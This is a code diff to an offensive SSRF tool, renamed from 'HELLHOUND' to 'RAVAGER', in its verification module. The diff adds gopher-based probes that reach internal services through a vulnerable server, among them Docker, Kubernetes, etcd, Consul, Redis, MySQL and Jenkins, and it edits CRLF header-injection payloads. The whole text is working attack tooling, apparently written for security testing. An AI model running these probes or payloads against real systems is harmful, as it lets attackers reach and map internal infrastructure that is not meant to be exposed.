@@ -1,5 +1,5 @@
 """
-HELLHOUND SSRF v5.0 - Phase 6: Evidence-Based Verification
+RAVAGER SSRF v2.0 - Phase 6: Evidence-Based Verification
 =============================================================
 v5 fixes and additions:
   [P0-FIX] SPA catch-all guard — build_port_state_map() delegates to
@@ -254,11 +254,15 @@ class BannerProbe:
     service:        str
     port:           int
     command:        bytes
-    transport:      str             # "gopher" | "dict"
+    transport:      str             # "gopher" | "dict" | "http"
     banner_markers: tuple[str, ...]
 
 
+# [v2-FIX] Expanded from 2 probes (Redis, Memcached) to cover all 14
+# known_exploits.py services. Each uses a read-only command that confirms
+# service identity without modifying state.
 _BANNER_PROBES: tuple[BannerProbe, ...] = (
+    # --- Database / Cache services ---
     BannerProbe(
         service="redis", port=6379,
         command=b"INFO\r\n",
@@ -271,6 +275,82 @@ _BANNER_PROBES: tuple[BannerProbe, ...] = (
         transport="dict",
         banner_markers=("STAT pid", "STAT version"),
     ),
+    BannerProbe(
+        service="mysql", port=3306,
+        command=b"",   # MySQL sends greeting banner unprompted on connect
+        transport="gopher",
+        banner_markers=("mysql", "MariaDB", "5.7.", "8.0.", "native_password"),
+    ),
+    # --- Service discovery / orchestration ---
+    BannerProbe(
+        service="elasticsearch", port=9200,
+        command=b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=("cluster_name", "cluster_uuid", "lucene_version", '"tagline"'),
+    ),
+    BannerProbe(
+        service="consul", port=8500,
+        command=b"GET /v1/agent/self HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=('"Config"', '"Member"', "consul", "Datacenter"),
+    ),
+    BannerProbe(
+        service="etcd", port=2379,
+        command=b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=("etcdserver", "etcdcluster"),
+    ),
+    BannerProbe(
+        service="zookeeper", port=2181,
+        command=b"srvr",  # 4-letter command: server stats
+        transport="gopher",
+        banner_markers=("Zookeeper version:", "Latency min/avg/max"),
+    ),
+    BannerProbe(
+        service="rabbitmq", port=15672,
+        command=b"GET /api/overview HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=("rabbitmq_version", "erlang_version", "cluster_name"),
+    ),
+    BannerProbe(
+        service="couchdb", port=5984,
+        command=b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=('"couchdb"', '"version"', "Welcome"),
+    ),
+    # --- Container / CI ---
+    BannerProbe(
+        service="docker", port=2375,
+        command=b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=("ApiVersion", "MinAPIVersion", "Os", "docker"),
+    ),
+    BannerProbe(
+        service="kubernetes", port=6443,
+        command=b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=("gitVersion", "gitCommit", "major", "minor"),
+    ),
+    BannerProbe(
+        service="jenkins", port=8080,
+        command=b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=("X-Jenkins", "Jenkins", "hudson"),
+    ),
+    # --- Monitoring ---
+    BannerProbe(
+        service="grafana", port=3000,
+        command=b"GET /api/health HTTP/1.0\r\nHost: localhost\r\n\r\n",
+        transport="gopher",
+        banner_markers=('"database"', '"commit"', "grafana"),
+    ),
+    # --- SMTP (send EHLO, read banner) ---
+    BannerProbe(
+        service="smtp", port=25,
+        command=b"EHLO ravager.local\r\n",
+        transport="gopher",
+        banner_markers=("220 ", "ESMTP", "250-", "Postfix", "Sendmail"),
+    ),
 )
 
 
@@ -282,6 +362,9 @@ async def fingerprint_internal_service(
     """
     Sends read-only INFO/stats commands via Gopher/Dict to fingerprint
     internal services. Confirms SSRF + service identity in one probe.
+
+    [v2-FIX] Sets confirmation_method='banner_confirmed' so scoring.py
+    can distinguish definitive banner probes from port-number inference.
     """
     for probe in _BANNER_PROBES:
         url = (
@@ -301,16 +384,17 @@ async def fingerprint_internal_service(
                 summary=(
                     f"Internal {probe.service.upper()} reachable at "
                     f"{target_host}:{probe.port} via SSRF — banner confirms "
-                    f"service identity (read-only {probe.command.decode().strip()} probe)."
+                    f"service identity (read-only {probe.command.decode().strip()[:20] or 'connect'} probe)."
                 ),
                 raw_evidence=result.body_snippet,
                 saved_path=saved,
                 schema_matched=True,
                 extra={
-                    "service":     probe.service,
-                    "host":        target_host,
-                    "port":        probe.port,
-                    "raw_request": result.raw_request,
+                    "service":             probe.service,
+                    "host":                target_host,
+                    "port":                probe.port,
+                    "raw_request":         result.raw_request,
+                    "confirmation_method": "banner_confirmed",
                 },
             )
     return None
@@ -389,9 +473,9 @@ async def check_crlf_injection(
         return None
 
     crlf_payloads = [
-        "%0d%0aX-Injected: hellhound-ssrf-v5",
-        "\r\nX-Injected: hellhound-ssrf-v5",
-        "%0aX-Injected: hellhound-ssrf-v5",
+        "%0d%0aX-Injected: ravager-ssrf-v2",
+        "\r\nX-Injected: ravager-ssrf-v2",
+        "%0aX-Injected: ravager-ssrf-v2",
     ]
     for payload in crlf_payloads:
         result = await client.send(
